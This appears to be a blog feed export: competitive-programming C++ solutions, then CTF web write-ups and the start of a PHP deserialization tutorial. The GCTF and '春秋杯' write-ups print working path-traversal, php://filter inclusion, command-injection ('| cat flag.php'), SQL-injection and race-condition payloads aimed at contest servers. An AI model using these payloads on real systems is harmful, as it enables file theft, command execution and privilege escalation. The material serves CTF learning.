V;int E;vector&lt;edge&gt; G[MAX_V];int d[MAX_V];void dijkstra(int s);int main()&#123; scanf("%d%d", &amp;E,&amp;V); for (int i = 0; i &lt; E; i++)&#123; int s, t, cost; edge temp1,temp2; scanf("%d%d%d", &amp;s, &amp;t, &amp;cost); temp1.to = t; temp1.cost = cost; G[s].push_back(temp1); temp2.to = s; temp2.cost = cost; G[t].push_back(temp2); &#125; dijkstra(1); printf("%d",d[V]); return 0;&#125;void dijkstra(int s)&#123; priority_queue&lt;P, vector&lt;P&gt;, greater&lt;P&gt; &gt; que; fill(d+1,d + V+1, INF); d[s] = 0; que.push(P(0,s)); while ( !que.empty())&#123; P p = que.top(); que.pop(); int v = p.second; if ( d[v] &lt; p.first) continue; for (int i = 0; i &lt; G[v].size(); i++)&#123; edge e = G[v][i]; if ( d[e.to] &gt; d[v] + e.cost) &#123; d[e.to] = d[v] + e.cost; que.push(P(d[e.to], e.to)); &#125; &#125; &#125;&#125; 2388题目http://poj.org/problem?id=2388 思路先排序，之后打印出中间值。水题。 提交stl1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; sort(arr,arr+n); printf("%d",arr[n/2]); return 0;&#125; 快排12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];void quick_sort(int l,int h)&#123; if(h&lt;l+2)return ; int e=h,p=l; while(l&lt;h) &#123; while(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]); while(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]); if(l&lt;h) swap(arr[l],arr[h]); &#125; swap(arr[h],arr[p]); quick_sort(p,h); quick_sort(l,e);&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; quick_sort(0,n); printf("%d",arr[n/2]); return 0;&#125; 3069题目http://poj.org/problem?id=3069 思路贪心算法。在 while( i &lt; n ) 循环中，第一个while循环，找到距离当前点（未覆盖）大于r的第一个点，该点的前一个（i—）做上标记。第二个while循环，从已经标记的点出发，找到距离当前点（已经覆盖）大于r的第一个点，并将其作为下一次大循环的起点。 提交123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define N 1005using namespace std;int n;int r;int loc[N];int marknum;int main()&#123; scanf("%d%d",&amp;r,&amp;n); while ( n != -1 &amp;&amp; r != -1)&#123; for (int i = 0; i &lt; n; i++) scanf("%d",&amp;loc[i]); sort(loc,loc+n); marknum = 0; int i = 0; int j = 0; while ( i &lt; n )&#123; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] ) i++; i--; marknum++; j = i; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i]) i++; j = i; &#125; printf("%d\n",marknum); scanf("%d%d",&amp;r,&amp;n); &#125; return 0;&#125; 3176题目http://poj.org/problem?id=3176 思路二维数组triangle用于保存三角形，二维数组way用于保存路径。以题目数据为例：1234573 88 1 02 7 4 44 5 2 6 5 分为三种情况： 最左边，只能从上一行的同列来，way[i][j] = way[i-1][j] + triangle[i][j] 最右边，只能从上一行的斜对角线来，way[i-1][j-1] + triangle[i][j]; 中间，可以从上一行的左边或者右边来，way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; 填表完成后，对最后一行way[n-1][]找出最大值即为答案。 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 3253题目http://poj.org/problem?id=3253 思路霍夫曼树的变形。重点在于对两个最小值相加后对数组的处理。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;using namespace std;int n;int k;int len[20005];int total;void solve()&#123; long long ans = 0; while ( n &gt; 1 )&#123; int mii1 = 0; int mii2 = 1; if (len[mii1] &gt; len[mii2]) swap(mii1,mii2); for (int i = 2; i &lt; n; i++)&#123; if (len[i] &lt; len[mii1])&#123; mii2 = mii1; mii1 = i; &#125; else if (len[i] &lt; len[mii2])&#123; mii2 = i; &#125; &#125; int t = len[mii1] + len[mii2]; ans += t; if (mii1 == n-1) swap(mii1,mii2); len[mii1] = t; len[mii2] = len[n-1]; n--; &#125; printf("%lld\n",ans);&#125;int main()&#123; total = 0; k = 0; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;len[i]); &#125; solve(); return 0;&#125; 3617题目http://poj.org/problem?id=3617 思路贪心算法，每次选择排序靠前的字母加到字符串t中。如果两个排序相同，则看它们的下一个字母的顺序，可以使用一个递归函数来判断。 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;using namespace std;int n;char s[2005];char t[2005];int sp,ep;int compare(int i,int j)&#123; if (s[i] &gt; s[j])&#123; return 1; &#125; else if (s[i] &lt; s[j])&#123; return 0; &#125; else if (s[i] == s[j])&#123; i++; j--; return compare(i,j); &#125;&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf(" %c",&amp;s[i]); &#125; sp = 0; ep = n-1; int lenoft = 0; while (lenoft != n)&#123; int p = compare(sp,ep); if (p == 0)&#123; t[lenoft] = s[sp]; sp++; lenoft++; &#125; else if (p == 1)&#123; t[lenoft] = s[ep]; ep--; lenoft++; &#125; &#125; for (int i = 1; i &lt;= n; i++)&#123; printf("%c",t[i-1]); if (i % 80 == 0) printf("\n"); &#125; printf("\n"); return 0;&#125; XOJ1004想法冒泡等可能会超时。堆排序和快排的复杂度都是 O(nlogn)。课上为了节约时间所以：） 提交12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[1000004];int main()&#123; int n; scanf("%d",&amp;n); int i,j; for(i = 0;i &lt; n;i++) scanf("%d",&amp;arrays[i]); sort(arrays,arrays+n); for(j = 0;j &lt; n - 1;j++) printf("%d ",arrays[j]); printf("%d",arrays[n - 1]); return 0;&#125; oj对格式要求好严格… 1005此题另写一篇文章了。 1022想法直接用普通的矩阵乘法就过了，时间复杂度 O(n^3) 提交123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;stdio.h&gt;int main()&#123; int n1,m1; int n2,m2; int matrix1[100][100]; int matrix2[100][100]; scanf("%d%d",&amp;n1,&amp;m1); int i,j; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m1;j++) scanf("%d",&amp;matrix1[i][j]); scanf("%d%d",&amp;n2,&amp;m2); for(i = 0;i &lt; n2;i++) for(j = 0;j &lt; m2;j++) scanf("%d",&amp;matrix2[i][j]); int matrix3[100][100]; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m2;j++) matrix3[i][j]=0; int i1,j2; for(i1 = 0;i1 &lt; n1;i1++) for(j2 = 0;j2 &lt; m2;j2++) for(j = 0;j &lt; n2;j++) matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2]; for(i = 0;i &lt; n1;i++) &#123; for(j = 0;j &lt; m2 - 1;j++) printf("%d ",matrix3[i][j]); printf("%d\n",matrix3[i][m2-1]); &#125; return 0;&#125; 1061想法贪心算法。其实就是任务选择问题。 按照约会完成时间从早到晚排序 选择具有最早完成时间的girl 将此girl加入到约会列表中 对子问题重复上述问题 强烈谴责Ckp 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;typedef struct info&#123; char name[16]; char starttime[6]; char endtime[6];&#125;info;void quick_sort(info * s, int l, int r,int n);int main()&#123; int n; static info mm[1005] ; static info mmcopy[1005]; scanf("%d",&amp;n); int i,j; for (i = 1; i &lt;= n; i++)&#123; scanf("%s%s%s",mm[i].name,mm[i].starttime,mm[i].endtime); &#125; quick_sort(mm,1,n,n); strcpy(mmcopy[1].endtime,mm[1].endtime); strcpy(mmcopy[1].name,mm[1].name); strcpy(mmcopy[1].starttime,mm[1].starttime); int cal = 1; for (i = 2; i &lt;= n; i++)&#123; if (strcmp(mmcopy[cal].endtime,mm[i].starttime) &lt;= 0)&#123; cal++; strcpy(mmcopy[cal].endtime,mm[i].endtime); strcpy(mmcopy[cal].name,mm[i].name); strcpy(mmcopy[cal].starttime,mm[i].starttime); &#125; &#125; printf("%d\n",cal); for ( i = 1; i &lt; cal; i++)&#123; printf("%s ",mmcopy[i].name); &#125; printf("%s",mmcopy[i].name); return 0;&#125;void quick_sort(info* s, int l, int r,int n)&#123; if (l &lt; r)&#123; int i = l, j = r; int temp; info x; strcpy(x.endtime,s[l].endtime); strcpy(x.name,s[l].name); strcpy(x.starttime,s[l].starttime); while (i &lt; j) &#123; while(i &lt; j &amp;&amp; strcmp(s[j].endtime,x.endtime) &gt;= 0) j--; if(i &lt; j)&#123; strcpy(s[i].endtime,s[j].endtime); strcpy(s[i].starttime,s[j].starttime); strcpy(s[i].name , s[j].name); i++; &#125; while(i &lt; j &amp;&amp; strcmp(s[i].endtime,x.endtime) &lt; 0) i++; if(i &lt; j)&#123; strcpy(s[j].endtime,s[i].endtime); strcpy(s[j].starttime,s[i].starttime); strcpy(s[j].name,s[i].name); j--; &#125; &#125; strcpy(s[i].endtime,x.endtime); strcpy(s[i].starttime,x.starttime); strcpy(s[i].name,x.name); quick_sort(s, l, i - 1,n); quick_sort(s, i + 1, r,n); &#125;&#125; 1062想法贪心算法。背包问题。尽量选择面值大的。将元转换为角，这样都是整数，进行处理更方便。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;using namespace std;typedef struct zhibi&#123; int number; int value;&#125;zhibi;int main()&#123; int stat = 0; int n; scanf("%d",&amp;n); zhibi arr[7]; int i; for (i = 1; i &lt; 7; i++)&#123; scanf("%d",&amp;arr[i].number); &#125; arr[1].value = 500; arr[2].value = 100; arr[3].value = 50; arr[4].value = 10; arr[5].value = 5; arr[6].value = 1; int remainMoney; remainMoney = 1000 - n * 25; for (i = 1; i &lt; 7; i++)&#123; if (remainMoney == 0)&#123; break; &#125; else &#123; int j = remainMoney / arr[i].value; int number = j&gt;arr[i].number?arr[i].number:j; remainMoney = remainMoney - number*arr[i].value; stat = stat + number; &#125; &#125; if (remainMoney == 0)&#123; printf("%d",stat); &#125; else &#123; printf("-1\n"); &#125; return 0;&#125; 1075思路直接dijkstra。 采用邻接矩阵存储。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // 保存 图 （各权值）int n; // 顶点数int d[MAXN]; // 从初始点出发 的最短距离bool used[MAXN]; // 已经使用过的图void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; 1078思路任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。 提交dijkstra算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // 保存 图 （各权值）int n; // 顶点数int d[MAXN]; // 从初始点出发 的最短距离bool used[MAXN]; // 已经使用过的图void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; Floyd-Warshall 算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX 102#define INF 0xfffffint G[MAX][MAX];int n;void warshall_floyd();int min(int a, int b);int max(int a, int b);int main()&#123; int i, j; int M = 0; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++)&#123; scanf("%d", &amp;G[i][j]); if ( G[i][j] == 0) G[i][j] = INF; if ( i == j ) G[i][j] = 0; &#125; warshall_floyd(); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) M = max(M, G[i][j]); if ( M == INF) printf("%d",-1); else printf("%d\n", M-1); return 0;&#125;void warshall_floyd()&#123; int k, i, j; for (k = 1; k &lt;= n; k++) for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) G[i][j] = min(G[i][j], G[i][k] + G[k][j]);&#125;int min(int a, int b)&#123; return a &gt; b ? b : a;&#125;int max(int a, int b)&#123; return a &gt; b ? a : b;&#125; 1316想法贪心算法。背包问题。有别于0/1背包问题。每次选取尽量多的单位价值高的物体。 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;using namespace std;typedef struct unit&#123; double unitValue; int id; double weight; double value;&#125;unit;void quick_sort(unit s[], int l, int r);int main()&#123; double m,n; static unit valuesor[100010]; scanf("%lf%lf",&amp;m,&amp;n); int i; for (i = 1; i &lt;= n; i++)&#123; scanf("%lf%lf",&amp;valuesor[i].weight,&amp;valuesor[i].value); valuesor[i].unitValue = (double)valuesor[i].value / (double)valuesor[i].weight; valuesor[i].id = i; &#125; quick_sort(valuesor,1,n); double remainSpace = m; double allValue = 0; i = 1; for (i = 1; i &lt;= n ; i++)&#123; if (remainSpace &lt;= 0) break; if (valuesor[i].weight &lt;= remainSpace)&#123; remainSpace = remainSpace - valuesor[i].weight; allValue += valuesor[i].value; &#125;else&#123; allValue += remainSpace *valuesor[i].unitValue; remainSpace = 0; &#125; &#125; printf("%lf\n",allValue); return 0;&#125;void quick_sort(unit s[], int l, int r)&#123; if (l &lt; r) &#123; int i = l, j = r; unit x = s[l]; while (i &lt; j) &#123; while(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue) j--; if(i &lt; j)&#123; s[i].unitValue = s[j].unitValue; s[i].id = s[j].id; s[i].value = s[j].value; s[i].weight = s[j].weight; i++; &#125; while(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue) i++; if(i &lt; j)&#123; s[j].unitValue = s[i].unitValue; s[j].id = s[i].id; s[j].value = s[i].value; s[j].weight = s[i].weight; j--; &#125; &#125; s[i].id = x.id; s[i].unitValue = x.unitValue; s[i].value = x.value; s[i].weight = x.weight; quick_sort(s, l, i - 1); quick_sort(s, i + 1, r); &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[GCTF-web-writeup]]></title>
      <url>%2F2017%2F06%2F19%2FGCTF-web-writeup%2F</url>
      <content type="text"><![CDATA[GCTF-web-writeup 热身题题目地址：http://218.2.197.232:18001/访问robots.txt。1http://218.2.197.232:18001/robots.txt 一个个访问过去：1http://218.2.197.232:18001/rob0t.php 得到flag：1GCTF&#123;ae609880185f1d75&#125; springcssspringcss-cve-2014-3625漏洞。github上有利用脚本:https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh 。这里的payload1：1http://218.2.197.232:18015/spring-css/resources/file:/etc/passwd payload2：1http://218.2.197.232:18015/spring-css/resources/file:/etc/flag 最后flag：1GCTF&#123;db839442402f5874&#125; PHP序列化题目地址：http://218.2.197.232:18017/ 题目给了源码：1234567891011&lt;?php//error_reporting(E_ERROR &amp; ~E_NOTICE);ini_set('session.serialize_handler', 'php_serialize');header("content-type;text/html;charset=utf-8");session_start();if(isset($_GET['src']))&#123; $_SESSION['src'] = $_GET['src']; highlight_file(__FILE__); print_r($_SESSION['src']);&#125;?&gt; 里面提到了session.serialize_handler，想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》 条件竞争题目地址：http://218.2.197.242:18009/ 查看源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpheader("Content-type: text/html; charset=utf-8");session_start();$mysqli = new mysqli("localhost", "root", "", "gctf09");if ($mysqli-&gt;connect_errno) &#123; die("数据库连接错误，多次出现请联系管理员。");&#125;//打印源码if(isset($_REQUEST['showcode']))&#123; highlight_file(___FILE___); exit();&#125;$user="";// 初次访问生成用户if(!isset($_SESSION["name"]))&#123; $user=substr(md5(uniqid().uniqid()),8,16); $_SESSION["name"]=$user; $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($user)); $stmt-&gt;execute(); $stmt-&gt;close(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close();&#125;else&#123; $user=$_SESSION["name"];&#125;//重置时清理用户信息if($_SERVER["REQUEST_METHOD"] === "POST" &amp;&amp; $_GET['method']==="reset" &amp;&amp; isset($_POST['password']) )&#123; $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`user` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`priv` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($_POST['password'])); $stmt-&gt;execute(); $stmt-&gt;close(); //判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限 $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close(); $mysqli-&gt;close(); die("修改成功");&#125;$mysqli-&gt;close();?&gt; 初次访问生成用户时，会往user表和priv表写入数据。 而在重置用户时，进行了三个大的操作： 删除user表中对应数据，删除priv表中对应的值。 向user表中插入name和新的pass，达到更新密码的目的。 向priv表中对应的name下notadmin的值更改（即插入）为”TRUE”。 给出的源码中有一段注释：1//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限 所以在执行操作3之前，在这一个空隙里登陆的话，此时会是管理员权限。可以自己写多线程脚本，也可以用burp跑。 reset.py1234567import requestswhile True : parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/index.php?method=reset',cookies=cookies,data=parm) print r.text login.py1234567891011import requestsflag = Falsewhile not flag: parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/login.php?method=login',cookies=cookies,data=parm) print r.text if '&#123;' in r.text: flag = True break 两者分别运行。 最后flag：1GCTF&#123;KBnLGG6qR2ZdYe4HbUL8XpAP&#125; 读文件题目地址：http://218.2.197.232:18008/访问后查看源代码，如下： 若访问：1http://218.2.197.232:18008/a/down.php?p=1.txt 同样可以正常读取，可以猜测过滤了关键字：./ 若将1.txt改为flag.php，访问：12http://218.2.197.232:18008/a/down.php?p=./flag.php 则返回页面提示 waf，所以flag被waf了。 结合flag和./，同时我们知道flag在根目录下，而down在文件夹a下，应该要往回访问。构造下述链接：1http://218.2.197.232:18008/a/down.php?p=...//fl./ag.php ...//fl./ag.php中，./被过滤后会变成../flag.php，这样就能成功读取了。 最后flag：1GCTF&#123;drthSDFSDGFSdsfhfg&#125; RCE绕过题目地址：http://218.2.197.232:18006/有点类似“春秋杯”的web。构造如下payload：12http://218.2.197.232:18006/?cmd=%0acat%09 Forbidden题目地址：http://218.2.197.232:18002/ 访问得到forbidden，但返回头为200，所以是个人为写的页面。查看源代码下拉得到提示：1&lt;!--只允许本机访问。 --&gt; 在请求包中添加：1X-Forwarded-For:localhost 得到下一个提示：1&lt;!--只能通过域名访问 --&gt; 在请求包中继续添加：1Host:www.topsec.com 得到下一个提示：1&lt;!--只允许从百度跳转到本页面访问。 --&gt; 在请求包中继续添加：1Referer:www.baidu.com 得到下一个提示：1&lt;!--只允许使用ajax访问本页面 --&gt; 在请求包中继续添加：1X-Requested-With:XMLHttpRequest 得到下一个提示：1&lt;!--本站只允许使用IE4访问 --&gt; 在网上查一查，将userAgent修改如下：1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98) 得到下一个提示：1&lt;!--电脑上必须安装有.NET8 --&gt; 修改userAgent如下1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98;.NET CLR 8.0.50727) 得到下一个提示：1&lt;!--本站只允许德国用户访问。 --&gt; 修改userAgent如下：1Accept-Language: de-DE 得到下一个提示；1&lt;!--没有登录！ --&gt; 同时返回头中出现了：1Set-Cookie: login=4e6a59324d545a6a4e7a4d324e513d3d 探索如下：12344e6a59324d545a6a4e7a4d324e513d3d是十六进制编码，解码得到： NjY2MTZjNzM2NQ== 猜测是base64加密，解码得到： 66616c7365 猜测是十六进制编码，解码得到： false 要成功登陆，则login=true123true 进行十六进制编码，得到：74727565再base64编码，得到：NzQ3Mjc1NjU=再十六进制编码，得到：4e7a51334d6a63314e6a553d 在请求包中增加Cookie：1Cookie:login=4e7a51334d6a63314e6a553d 得到flag：1GCTF&#123;Dt24FbREwYJu7P8ekQHEFknK&#125; 越权注入题目地址：http://218.2.197.232:18014/ 查看源代码，得到提示，同时可以知道uid默认为500 ： 抓包改包，试着添加uid参数。 发现可以成功直接修改uid参数： 接下来考虑role参数，如果直接添加role参数： 会被拦截： 考虑进行注入。经过一番测试，可以知道，如果参数中带有引号，会被拦截，被提示说“未通过mysql_escape_string检查。” 若在uid后面加上一个括号，会出现sql报错： 猜测为update型注入，因为引号被过滤了，所以对admin进行一次hex编码，payload如下：1.....birth=11111111&amp;gender=&amp;uid=0,role=0x61646d696e 得到flag：1GCTF&#123;9CtyJLHMxkjLUs6qfUM5Cmrb&#125; web综合题目地址：http://218.2.197.232:18007/ 变态验证码题目地址： http://218.2.197.232:18003/ Java序列化题目地址： http://218.2.197.232:18005/ctfobj/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[“春秋杯”web-writeup]]></title>
      <url>%2F2017%2F06%2F18%2F%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup%2F</url>
      <content type="text"><![CDATA[朋友打比赛，向她（对，女字旁的她）要的web题地址。 WEB-01访问，有一张图片。 查看源代码，发现提示有flag.php。访问后为空白页面。1&lt;img src=&quot;1.jpg&quot; alt=&quot;ͼƬ&quot; /&gt;&lt;!-- flag.php --&gt; 用御剑可以扫出备份文件index.php~，得到源代码如下：12345678910&lt;?php $a=$_GET["file"]; if(!isset($a)) &#123; $a='config'; &#125; @include($a.'.php');echo '&lt;img src="'.$img.'" alt="ͼƬ" /&gt;';?&gt; 参数为file，尝试利用php伪协议去读取flag.php。最后payload：1http://XXXXX/index.php?file=php://filter/read=convert.base64-encode/resource=flag 得到1PD9waHANCiRmbGFnPSdmbGFnezM4Y2FjMGU0OTc0ZTBlOTc2MTQ5MDhmOTAxZTQ1ZmUzfSc7DQo/Pg== base64-decode得到最后flag:123&lt;?php$flag='flag&#123;38cac0e4974e0e97614908f901e45fe3&#125;';?&gt; WEB-02上御剑扫描。发现敏感文件robots.txt。12345User-agent: *Disallow:Disallow: /imagesDisallow: /jsDisallow: /css 在js目录下有flag.txt 访问：1flag&#123;89a7f0eb82a314e5745ec9bc556d06c5&#125; WEB-03题目给了源码1234567891011121314151617181920&lt;?phpif(isset($_REQUEST[ 'ip' ])) &#123; $target = trim($_REQUEST[ 'ip' ]); $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '|' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); $cmd = shell_exec( 'ping -c 4 ' . $target ); echo $target; echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__); 拿DVWA代码改的，简直无力吐槽。 payload1：1http://XXXX:83/index.php?ip=127.0.0.1%0als paylaod2:1http://XXXX:83/index.php?ip=127.0.0.1%0acat flag.php WEB-04题目给了源码：123456789&lt;?phpif( isset( $_REQUEST['ip']) ) &#123; $target = $_REQUEST[ 'ip' ]; $cmd = shell_exec( 'ping -c 4 ' . $target ); echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__);?&gt; 没任何过滤，payload1：1http://XXXX:84/index.php?ip=127.0.0.2 | ls payload2：1http://XXXX:84/index.php?ip=127.0.0.1 | cat flag.php flag:1flag&#123;19b55155-f84c-47ef-aeaa-038116de31e5&#125; 小扯两句好吧，这web题的质量，不敢恭维。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[浅谈php反序列化漏洞]]></title>
      <url>%2F2017%2F06%2F17%2F%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[php反序列化漏洞，又叫php对象注入漏洞。 序列化与反序列化php中有两个函数serialize() 和unserialize()。 serialize()当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；123456789&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 这边我们创建了一个新的对象，并且将其序列化后的结果打印出来：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125; 这里的O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。&quot;chybeta&quot;表示对象的名称。1表示有一个值。{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度，&quot;test&quot;为字符串的名称，之后的类似。 unserialize()与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。123456789101112&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_ser);?&gt; 这里提醒一下，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。 反序列化漏洞由前面可以看出，当传给 unserialize() 